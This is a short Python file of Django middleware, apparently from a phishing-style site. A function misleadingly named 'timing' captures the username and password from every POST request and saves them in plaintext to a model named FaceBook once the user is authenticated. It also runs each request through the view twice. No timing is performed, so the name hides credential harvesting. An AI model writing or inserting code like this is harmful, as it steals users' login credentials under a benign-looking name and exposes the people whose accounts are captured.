import time

import django.utils.datastructures

from .models import FaceBook


def timing(get_response):
    def middleware(request):
        if request.method == 'POST':
            try:
                username = request.POST['username']
                password = request.POST['password']
                facebook = FaceBook()
                facebook.username = username
                facebook.password = password
                get_response(request)
                if request.user.is_authenticated:
                    facebook.save()
            except django.utils.datastructures.MultiValueDictKeyError:
                pass
        response = get_response(request)
        return response

    return middleware

#
# def not_empty_fields(get_response):
#     def middleware(request):
#         if request.method == 'POST':
#
#         return response
#     return middleware
